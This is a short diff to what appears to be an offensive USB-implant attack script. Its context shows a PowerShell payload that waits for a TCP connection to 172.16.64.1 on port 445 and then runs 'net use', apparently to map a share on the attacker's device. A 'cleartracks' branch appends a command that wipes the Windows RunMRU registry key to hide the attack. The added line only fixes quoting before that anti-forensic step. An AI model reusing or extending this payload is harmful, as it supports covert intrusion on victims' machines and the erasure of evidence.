@@ -36,6 +36,7 @@ PAYLOAD="While(!!(New-Object net.sockets.tcpclient (172.16.64.1,445))){};net use
 
 # If cleartracks add the code to the powershell payload
 if [ $CLEARTRACKS == "yes" ]; then
+  PAYLOAD=${PAYLOAD%\"}
   PAYLOAD="${PAYLOAD};rp HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -N '*'"
 fi
 
